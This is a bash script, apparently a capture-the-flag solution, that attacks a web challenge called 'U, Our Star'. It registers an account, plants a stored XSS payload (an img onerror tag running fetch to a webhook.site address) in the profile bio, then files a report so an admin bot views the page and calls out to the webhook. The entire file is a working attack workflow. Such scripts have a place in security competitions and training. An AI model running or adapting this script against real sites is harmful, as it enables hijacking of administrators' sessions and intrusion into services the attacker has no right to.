#!/bin/bash

BASE_URL="http://web.runa2025.kr:5005"
WEBHOOK_URL="https://webhook.site/YOUR_UNIQUE_ID"  # You can get free webhook at webhook.site

USERNAME="xss_test_$(date +%s)"
PASSWORD="password123"
COOKIE_JAR=$(mktemp)

echo "[*] XSS Testing on U, Our Star"
echo "[*] Webhook: $WEBHOOK_URL"
echo ""

# 1. Register
echo "[1] Creating account..."
curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
  -X POST "$BASE_URL/auth/register" \
  -d "username=$USERNAME&password=$PASSWORD&age=25&mbti=ISTJ&sex=남" > /dev/null
echo "[+] Account created: $USERNAME"

# 2. XSS Payload - very simple test
XSS_PAYLOAD="<img src=x onerror=\"
  fetch('$WEBHOOK_URL?xss=triggered&user=$USERNAME')
    .catch(e => fetch('$WEBHOOK_URL?xss=failed&error=' + e.message))
\">"

# 3. Update profile
echo "[2] Injecting XSS payload..."
curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
  -X POST "$BASE_URL/user/profile/$USERNAME" \
  --data-urlencode "bio=$XSS_PAYLOAD" \
  -d "theme=" > /dev/null
echo "[+] Profile updated"

# 4. Submit report
echo "[3] Submitting report..."
curl -s -c "$COOKIE_JAR" -b "$COOKIE_JAR" \
  -X POST "$BASE_URL/report" \
  -d "username=$USERNAME" > /dev/null
echo "[+] Report submitted"

echo ""
echo "[*] Waiting 30 seconds for admin to visit..."
for i in {1..30}; do
  echo -n "."
  sleep 1
done
echo ""

echo "[4] Check your webhook for requests:"
echo "    $WEBHOOK_URL"
echo ""
echo "[*] Payload sent:"
echo "$XSS_PAYLOAD"

rm -f "$COOKIE_JAR"
